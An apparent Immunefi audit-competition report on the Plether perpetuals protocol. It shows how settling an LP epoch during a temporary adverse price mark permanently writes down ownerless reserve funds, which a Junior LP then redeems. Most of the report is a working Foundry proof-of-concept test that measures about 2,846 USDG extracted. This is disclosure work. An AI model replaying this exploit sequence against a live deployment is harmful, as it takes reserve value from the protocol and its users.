# \#99921 [SC-Medium] Reversible mark converts ownerless reserve into redeemable Junior principal

**Submitted on Nov 15th 2026 at 18:18:24 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99921
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
An ordinary Junior LP who also holds a Short can receive pool value reserved as unassignedAssets, without an owner assignment or matching share mint. If an LP epoch settles during an adverse but temporary mark, reconciliation writes down the ownerless balance. When the mark returns, the written-down amount is credited to LP principal. The LP can then redeem it for USDG.

A public Router-path Foundry test with a $1.00 → $1.05 → $1.00 mock mark produced 2,845.915062 USDG more cash for the LP than a matched control. The attack and control had identical pool cash and trader balances before the final redemption.

## Vulnerability Details
The accounting specification excludes value without a valid claimant from tranche ownership. HousePool.assignUnassignedAssets is the explicit owner-only route for assigning that value to a tranche and minting shares.

During a fresh reconciliation, however, HousePoolReconcilePlanLib.planReconcile caps the stored reserve to current marked equity:
```solidity
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable
        ? snapshot.distributable
        : state.unassignedAssets;
```
HousePool._reconcile persists the reduced amount. There is no record of the ownerless value written down by the temporary mark. After the mark reverses, the planner subtracts only the reduced unassignedAssets balance from distributable equity and routes the remainder through the Senior/Junior waterfall. No call to assignUnassignedAssets or corresponding share mint occurs.

## Impact Details
The PoC seeds both tranches with the documented 1 USDG amounts. The owner contributes 200,000 USDG through recapitalizePool, which reconciliation records as unassignedAssets. The attacker deposits 1,000 USDG as a Junior LP, funds a trader account with 20,000 USDG, and opens an 80,000-token Short through the public Router.

The attacker requests a Junior redemption and settles its matured epoch at the $1.05 mark. Junior NAV is zero, so the request is refunded, but settlement persists the ownerless write-down. The mark then returns to $1.00; the trader closes the same Short and the LP redeems. A snapshot control receives the same marks and closes the same position, but skips the interim adverse-mark LP settlement.

| Measured value | Attack | Control |
| --- | ---: | ---: |
| `unassignedAssets` after recovery | 197,151.210317 | 200,000.000000 USDG |
| Pool cash before final redemption | 201,024.266265 | 201,024.266265 USDG |
| Trader assets before final redemption | 19,935.533736 | 19,935.533736 USDG |
| Junior principal before final settlement | 3,872.055912 | 1,023.266229 USDG |
| **LP redemption payout** | **3,868.148723** | **1,022.233661 USDG** |

The ownerless balance falls by 2,848.789683 USDG. That same amount appears in additional projected Junior principal; the attacker receives 2,845.915062 USDG of additional redemption cash after share pricing.



## Proof of Concept

## Proof of Concept

From the repository root:

```
forge test --root packages/perps --offline \
  --match-path 'test/poc/PoC_OwnerlessMarkRecovery.t.sol' -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Matched public-path test of a temporary mark against ownerless pool cash.
contract PoC_OwnerlessMarkRecovery is BasePerpTest {
    address internal constant LP = address(0xA771);
    address internal constant TRADER = address(0xC0FFEE);
    address internal constant KEEPER = address(0xB0B);
    uint256 internal constant SIZE = 80_000e18;
    uint256 internal constant U = 200_000e6;
    uint256 internal constant HIGH_MARK = 105_000_000;

    struct Outcome {
        uint256 cash;
        uint256 ownerless;
        uint256 senior;
        uint256 seniorHwm;
        uint256 junior;
        uint256 juniorSupply;
        uint256 seniorSupply;
        uint256 payout;
        uint256 cashBeforeFinal;
        uint256 traderAssetsBeforeFinal;
        uint256 projectedSeniorBeforeFinal;
        uint256 projectedJuniorBeforeFinal;
        uint256 traderClaimBeforeFinal;
        uint256 keeperAssetsBeforeFinal;
        uint256 treasuryAssetsBeforeFinal;
        uint256 lpWalletAfter;
        uint256 traderWalletAfter;
        uint256 traderAssetsAfter;
        uint256 traderClaimAfter;
        uint256 keeperAssetsAfter;
        uint256 treasuryAssetsAfter;
        uint256 pendingRecapitalizationAfter;
        uint256 pendingTradingRevenueAfter;
        uint256 highOwnerless;
        uint256 highSenior;
        uint256 highJunior;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maintMarginBps = 10;
        p.initMarginBps = 20;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _finishCooldown() internal {
        uint256 unlockTime = juniorVault.lastDepositTime(LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlockTime) vm.warp(unlockTime);
    }

    function _openPublic() internal {
        _fundTrader(TRADER, 20_000e6);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 10_000e6, type(uint256).max, false);
        bytes[] memory data = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.executeOrder(id, data);
        (uint256 openedSize,,,,,,) = engine.positions(TRADER);
        assertEq(openedSize, SIZE, "public open must execute");
    }

    function _closePublic() internal {
        vm.prank(TRADER);
        uint64 id = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 1, true);
        bytes[] memory data = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.executeOrder(id, data);
        (uint256 positionSize,,,,,,) = engine.positions(TRADER);
        assertEq(positionSize, 0, "public close must execute");
    }

    function _run(bool interimSettle, uint256 commonFinalTime, uint256 shares)
        internal returns (Outcome memory o, uint256 finalTime)
    {
        _finishCooldown();
        vm.prank(LP);
        uint256 requestId = juniorVault.requestRedeem(shares, LP, LP);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < maturity) vm.warp(maturity);

        bytes[] memory highData = _mockPythUpdateData(HIGH_MARK);
        vm.prank(KEEPER);
        if (interimSettle) router.settleLpEpoch(highData);
        else router.updateMarkPrice(highData);

        o.highOwnerless = pool.unassignedAssets();
        o.highSenior = pool.seniorPrincipal();
        o.highJunior = pool.juniorPrincipal();

        if (interimSettle) {
            vm.prank(LP);
            uint256 refunded = juniorVault.claimRedeemRefund(requestId, LP, LP);
            assertEq(refunded, shares, "zero-NAV epoch refunds shares");
        }

        bytes[] memory lowData = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.updateMarkPrice(lowData);
        _closePublic();
        o.cashBeforeFinal = pool.totalAssets();
        o.traderAssetsBeforeFinal = clearinghouse.balanceAssets(TRADER);
        o.traderClaimBeforeFinal = engine.totalTraderClaimBalanceAssets();
        o.keeperAssetsBeforeFinal = clearinghouse.balanceAssets(KEEPER);
        o.treasuryAssetsBeforeFinal = clearinghouse.balanceAssets(engine.protocolTreasury());
        (o.projectedSeniorBeforeFinal, o.projectedJuniorBeforeFinal,,) = pool.getPendingTrancheState();

        if (interimSettle) {
            _finishCooldown();
            vm.prank(LP);
            requestId = juniorVault.requestRedeem(shares, LP, LP);
            finalTime = pool.lpEpochStart(requestId);
        } else {
            finalTime = commonFinalTime;
        }
        if (vm.getBlockTimestamp() < finalTime) vm.warp(finalTime);
        bytes[] memory finalData = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(finalData);

        o.cash = pool.totalAssets();
        o.ownerless = pool.unassignedAssets();
        o.senior = pool.seniorPrincipal();
        o.seniorHwm = pool.seniorHighWaterMark();
        o.junior = pool.juniorPrincipal();
        o.juniorSupply = juniorVault.totalSupply();
        o.seniorSupply = seniorVault.totalSupply();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, LP);
        uint256 beforeBalance = settlementToken.balanceOf(LP);
        vm.prank(LP);
        juniorVault.claimRedeem(requestId, claimable, LP, LP);
        o.payout = settlementToken.balanceOf(LP) - beforeBalance;
        o.lpWalletAfter = settlementToken.balanceOf(LP);
        o.traderWalletAfter = settlementToken.balanceOf(TRADER);
        o.traderAssetsAfter = clearinghouse.balanceAssets(TRADER);
        o.traderClaimAfter = engine.totalTraderClaimBalanceAssets();
        o.keeperAssetsAfter = clearinghouse.balanceAssets(KEEPER);
        o.treasuryAssetsAfter = clearinghouse.balanceAssets(engine.protocolTreasury());
        o.pendingRecapitalizationAfter = pool.pendingRecapitalizationAssets();
        o.pendingTradingRevenueAfter = pool.pendingTradingRevenueAssets();
    }

    function test_PublicMarkReversalTransfersOwnerlessValueToJuniorLp() public {
        _fundJunior(LP, 1_000e6);
        assertTrue(pool.isTradingActive());
        settlementToken.mint(address(this), U);
        settlementToken.approve(address(engine), U);
        engine.recapitalizePool(U);
        // A normal public LP epoch processes the owner-funded recap. The LP
        // redeems a small amount to create real queue progress, then retains
        // more than 99% of Junior shares for the attack branch.
        _finishCooldown();
        uint256 warmupShares = juniorVault.balanceOf(LP) / 100;
        vm.prank(LP);
        uint256 warmupRequest = juniorVault.requestRedeem(warmupShares, LP, LP);
        uint256 warmupMaturity = pool.lpEpochStart(warmupRequest);
        if (vm.getBlockTimestamp() < warmupMaturity) vm.warp(warmupMaturity);
        bytes[] memory baselineData = _mockPythUpdateData(1e8);
        router.settleLpEpoch(baselineData);
        uint256 warmupClaimable = juniorVault.claimableRedeemRequest(warmupRequest, LP);
        vm.prank(LP);
        juniorVault.claimRedeem(warmupRequest, warmupClaimable, LP, LP);
        assertEq(pool.unassignedAssets(), U);
        _openPublic();
        uint256 shares = juniorVault.balanceOf(LP);
        assertGt(shares * 10_000 / juniorVault.totalSupply(), 9_900, "attacker owns more than 99% of Junior");

        uint256 start = vm.snapshotState();
        (Outcome memory attack, uint256 finalTime) = _run(true, 0, shares);
        assertTrue(vm.revertToState(start));
        (Outcome memory control,) = _run(false, finalTime, shares);

        emit log_named_uint("attack_high_ownerless", attack.highOwnerless);
        emit log_named_uint("attack_high_senior", attack.highSenior);
        emit log_named_uint("attack_high_junior", attack.highJunior);
        emit log_named_uint("attack_cash", attack.cash);
        emit log_named_uint("control_cash", control.cash);
        emit log_named_uint("attack_cash_before_final", attack.cashBeforeFinal);
        emit log_named_uint("control_cash_before_final", control.cashBeforeFinal);
        emit log_named_uint("attack_trader_assets_before_final", attack.traderAssetsBeforeFinal);
        emit log_named_uint("control_trader_assets_before_final", control.traderAssetsBeforeFinal);
        emit log_named_uint("attack_trader_claim_before_final", attack.traderClaimBeforeFinal);
        emit log_named_uint("control_trader_claim_before_final", control.traderClaimBeforeFinal);
        emit log_named_uint("attack_keeper_assets_before_final", attack.keeperAssetsBeforeFinal);
        emit log_named_uint("control_keeper_assets_before_final", control.keeperAssetsBeforeFinal);
        emit log_named_uint("attack_treasury_assets_before_final", attack.treasuryAssetsBeforeFinal);
        emit log_named_uint("control_treasury_assets_before_final", control.treasuryAssetsBeforeFinal);
        emit log_named_uint("attack_ownerless", attack.ownerless);
        emit log_named_uint("control_ownerless", control.ownerless);
        emit log_named_uint("attack_senior", attack.senior);
        emit log_named_uint("control_senior", control.senior);
        emit log_named_uint("attack_senior_hwm", attack.seniorHwm);
        emit log_named_uint("control_senior_hwm", control.seniorHwm);
        emit log_named_uint("attack_junior", attack.junior);
        emit log_named_uint("control_junior", control.junior);
        emit log_named_uint("attack_junior_supply", attack.juniorSupply);
        emit log_named_uint("control_junior_supply", control.juniorSupply);
        emit log_named_uint("attack_projected_junior_before_final", attack.projectedJuniorBeforeFinal);
        emit log_named_uint("control_projected_junior_before_final", control.projectedJuniorBeforeFinal);
        emit log_named_uint("attack_payout", attack.payout);
        emit log_named_uint("control_payout", control.payout);
        emit log_named_uint("attack_lp_plus_trader_assets", attack.lpWalletAfter + attack.traderWalletAfter + attack.traderAssetsAfter);
        emit log_named_uint("control_lp_plus_trader_assets", control.lpWalletAfter + control.traderWalletAfter + control.traderAssetsAfter);
        emit log_named_uint("attack_keeper_assets_after", attack.keeperAssetsAfter);
        emit log_named_uint("control_keeper_assets_after", control.keeperAssetsAfter);
        emit log_named_uint("attack_treasury_assets_after", attack.treasuryAssetsAfter);
        emit log_named_uint("control_treasury_assets_after", control.treasuryAssetsAfter);
        assertLt(attack.highOwnerless, U, "interim public settlement writes down ownerless cash");
        assertEq(attack.ownerless, attack.highOwnerless, "recovery does not restore ownerless basis");
        assertEq(control.ownerless, U, "control retains ownerless basis");
        assertEq(attack.juniorSupply, control.juniorSupply);
        assertEq(attack.seniorSupply, control.seniorSupply);
        assertApproxEqAbs(attack.senior, control.senior, 1e6, "coupon timing has at most dust impact");
        assertApproxEqAbs(attack.seniorHwm, control.seniorHwm, 1e6, "HWM timing has at most dust impact");
        assertEq(attack.cashBeforeFinal, control.cashBeforeFinal, "same physical cash before redemption funding");
        assertEq(attack.traderAssetsBeforeFinal, control.traderAssetsBeforeFinal, "same final trader claim");
        assertEq(attack.traderClaimBeforeFinal, control.traderClaimBeforeFinal);
        assertEq(attack.keeperAssetsBeforeFinal, control.keeperAssetsBeforeFinal);
        assertEq(attack.treasuryAssetsBeforeFinal, control.treasuryAssetsBeforeFinal);
        assertEq(attack.traderAssetsAfter, control.traderAssetsAfter);
        assertEq(attack.traderClaimAfter, control.traderClaimAfter);
        assertEq(attack.keeperAssetsAfter, control.keeperAssetsAfter);
        assertEq(attack.treasuryAssetsAfter, control.treasuryAssetsAfter);
        assertEq(attack.pendingRecapitalizationAfter, control.pendingRecapitalizationAfter);
        assertEq(attack.pendingTradingRevenueAfter, control.pendingTradingRevenueAfter);
        assertApproxEqAbs(
            attack.projectedJuniorBeforeFinal - control.projectedJuniorBeforeFinal,
            control.ownerless - attack.ownerless,
            100,
            "lost ownerless basis becomes Junior principal before redemption"
        );
        assertGt(
            attack.lpWalletAfter + attack.traderWalletAfter + attack.traderAssetsAfter,
            control.lpWalletAfter + control.traderWalletAfter + control.traderAssetsAfter + 100e6,
            "same trading fees and carry, but attacker-controlled LP and trader own more assets"
        );
        assertGt(attack.projectedJuniorBeforeFinal, control.projectedJuniorBeforeFinal + 100e6);
        assertGt(attack.payout, control.payout + 100e6, "Junior LP extracts reserve value");
    }
}
```
